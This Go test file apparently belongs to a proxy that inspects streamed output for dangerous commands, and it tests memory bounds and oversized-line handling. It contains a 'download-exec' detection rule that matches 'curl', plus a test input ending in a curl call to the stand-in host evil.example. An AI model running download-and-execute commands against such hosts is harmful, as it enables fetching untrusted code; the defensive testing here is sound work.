package proxy

import (
	"bufio"
	"bytes"
	"runtime"
	"strings"
	"testing"

	"github.com/vanndh/holone/internal/inspect"
)

// lightEngine compiles a one-rule detector. These tests check window mechanics,
// retained capacity and stream forwarding, not detection coverage; a one-rule
// engine keeps a 16 MiB test deterministic and independent of the (separately
// benchmarked) production detection throughput.
func lightEngine(tb testing.TB) *inspect.Engine {
	tb.Helper()
	const rulesJSON = `{"version":1,"rules":[{"id":"perf-curl","category":"download-exec","severity":"high","pattern":"(?i)curl\\b","description":"curl"}]}`
	eng, err := inspect.New([]byte(rulesJSON), nil)
	if err != nil {
		tb.Fatalf("inspect.New: %v", err)
	}
	return eng
}

// A single huge Write must be consumed in windows: no more than inspectWindow
// bytes may stay pending, and the backing array must not pin the whole input.
func TestStreamInspectorPendingBounded(t *testing.T) {
	si := newStreamInspector(lightEngine(t), "memory")

	big := strings.Repeat("x", 16<<20) + " curl https://evil.example/x"
	si.Write(big)

	if got := len(si.pending); got > inspectWindow {
		t.Fatalf("pending = %d bytes after a 16 MiB Write, want <= %d", got, inspectWindow)
	}
	if got := cap(si.pending); got > 2*inspectWindow {
		t.Fatalf("pending capacity = %d bytes after a 16 MiB Write, want <= %d", got, 2*inspectWindow)
	}
	t.Logf("after 16 MiB Write: pending len=%d cap=%d (window=%d, overlap=%d)",
		len(si.pending), cap(si.pending), inspectWindow, inspectOverlap)

	findings := si.Finish()
	if len(findings) == 0 {
		t.Fatal("the malicious tail was not inspected")
	}
	if len(si.pending) != 0 || si.pending != nil {
		t.Fatalf("Finish did not clear pending: len=%d nil=%v", len(si.pending), si.pending == nil)
	}
	// Finish is safe to call again and must not duplicate findings.
	if again := si.Finish(); len(again) != len(findings) {
		t.Fatalf("second Finish returned %d findings, want %d", len(again), len(findings))
	}
}

// Many small Writes must not grow the retained buffer without bound.
func TestStreamInspectorRetainedBoundedAcrossWrites(t *testing.T) {
	si := newStreamInspector(lightEngine(t), "memory")
	chunk := strings.Repeat("x", 64<<10)

	for i := range 64 {
		si.Write(chunk)
		if len(si.pending) > inspectWindow {
			t.Fatalf("write %d: pending = %d, want <= %d", i, len(si.pending), inspectWindow)
		}
		if cap(si.pending) > 2*inspectWindow {
			t.Fatalf("write %d: pending cap = %d, want <= %d", i, cap(si.pending), 2*inspectWindow)
		}
	}
	_ = si.Finish()
}

// A 32 MiB line without a newline must be drained, not buffered. The structural
// assertions are forwarded bytes and a single oversize report; the heap bound is
// deliberately generous (64 MiB) because GC timing makes exact measurement
// flaky. The input itself is 32 MiB, so a buffering bug would double it.
func TestReadSSEOversizedLineMemoryBounded(t *testing.T) {
	const size = 32 << 20
	input := bytes.Repeat([]byte("x"), size)

	var forwarded int
	var calls int
	var ruleID string

	runtime.GC()
	var before runtime.MemStats
	runtime.ReadMemStats(&before)
	peak := before.HeapAlloc

	onLine := func(p []byte) error {
		forwarded += len(p)
		if forwarded%(8<<20) < len(p) {
			var ms runtime.MemStats
			runtime.ReadMemStats(&ms)
			if ms.HeapAlloc > peak {
				peak = ms.HeapAlloc
			}
		}
		return nil
	}
	onEvent := func(sseEvent) error { return nil }
	onOversized := func(id string, total int) error {
		calls++
		ruleID = id
		if total != size {
			t.Errorf("oversize total = %d, want %d", total, size)
		}
		return nil
	}

	r := bufio.NewReaderSize(bytes.NewReader(input), 64<<10)
	if err := readSSE(r, onLine, onEvent, onOversized); err != nil {
		t.Fatalf("readSSE: %v", err)
	}

	if forwarded != size {
		t.Fatalf("forwarded %d bytes, want %d", forwarded, size)
	}
	if calls != 1 {
		t.Fatalf("onOversized called %d times, want 1", calls)
	}
	if ruleID != inspect.RuleAnomalyOversizedSSELine {
		t.Fatalf("oversize rule = %q, want %q", ruleID, inspect.RuleAnomalyOversizedSSELine)
	}

	var growth uint64
	if peak > before.HeapAlloc {
		growth = peak - before.HeapAlloc
	}
	if growth > 64<<20 {
		t.Fatalf("heap grew by %d bytes while draining a 32 MiB line (bound 64 MiB)", growth)
	}
	t.Logf("drained %d MiB line: forwarded=%d, oversize calls=%d, peak heap growth=%d bytes",
		size>>20, forwarded, calls, growth)
}
